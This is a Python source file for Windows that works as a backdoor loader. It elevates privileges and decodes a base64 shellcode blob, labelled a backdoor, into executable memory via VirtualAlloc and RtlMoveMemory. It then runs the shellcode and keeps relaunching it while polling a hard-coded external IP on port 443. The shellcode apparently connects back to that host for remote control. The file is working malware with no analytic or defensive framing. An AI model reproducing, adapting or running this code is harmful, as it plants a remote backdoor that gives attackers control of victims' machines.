from subprocess import Popen, SW_HIDE, STARTUPINFO, STARTF_USESHOWWINDOW
from elevate import elevate
from multiprocessing import Process
from requests import get
from winreg import *
from shutil import copyfile
from time import sleep
import socket
import ctypes
import base64
import sys
import os

def ShellCode_backdoor_in_base64():
	try:
		var1 = "/EiD5PDozAAAAEFRQVBSUUgx0mVIi1JgVkiLUhhIi1IgSItyUE0xyUgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6A4AAAAxODUuNjUuMjAwLjk2AFpIicFJx8C7AQAATTHJU1NqA1NJuleJn8YAAAAA/9XotgAAAC9Pdy1LZFE3TDdQTldxMWVwTWZhTkh3OWZtUFhPM0FZT1htVWNmazFYUVRZaGRyeDNGeTRRamFQczRQTHJ4OUNNcUpIRkdheVpYRDN5ZkFJRFVBQUtaSmpHZkhpb2Q2dnZyQXlyNHFvR1I1NUV6dlNtVmtXSndLbXJuM3pGN1VIRVBLaFZNWFJYQzJrNDVzelV4WjZ3WUV2eVJpZUFCNG5BdHU0ek9yNHAyZkQ2d3ljcnNqYTAASInBU1pBWE0xyVNIuAAyqIQAAAAAUFNTScfC61UuO//VSInGagpfSInxah9aUmiAMwAASYngagRBWUm6dUaehgAAAAD/1U0xwFNaSInxTTHJTTHJU1NJx8ItBhh7/9WFwHUfSMfBiBMAAEm6RPA14AAAAAD/1Uj/z3QC66roVQAAAFNZakBaSYnRweIQScfAABAAAEm6WKRT5QAAAAD/1UiTU1NIiedIifFIidpJx8AAIAAASYn5SboSloniAAAAAP/VSIPEIIXAdLJmiwdIAcOFwHXSWMNYagBZScfC8LWiVv/V"
	
		var2 = var1.encode("utf-8")

		var3 = base64.b64decode(var2)

		cbuf = (ctypes.c_char * len(var3)).from_buffer_copy(var3)

		ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p

		ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_long(0),ctypes.c_long(len(var3)*2),ctypes.c_int(0x3000),ctypes.c_int(0x40))

		ctypes.windll.kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p,ctypes.c_void_p,ctypes.c_int]

		ctypes.windll.kernel32.RtlMoveMemory(ptr,cbuf,ctypes.c_int(len(var3)*2))

		ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()

		input()
	except Exception as r:
		print(r)
		return False

def check_connection(server_ip, server_port):
	while True:
		sock = None

		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			res_ = sock.connect_ex(( server_ip, server_port ))

			if res_ == 0:
				print("EXCELLENT")

				sock.close()

				sleep(2)

				return False
			else:
				print("NO connection")

				emergency_restart()

				sleep(5)
		except:
			pass

def emergency_restart():
	while True:
		try:
			ShellCode_backdoor_in_base64()
		except Exception as e:
			print(e)
			sleep(5)

def main():
	try:
		elevate()

		process1 = Process( target = check_connection, args=("185.65.200.96", 443) )
		process2 = Process( target = emergency_restart )

		process1.start()
		process2.start()

		process1.join()
		process2.join()

	except OSError:
		sleep(15)
		main()

if __name__ == '__main__':
	main()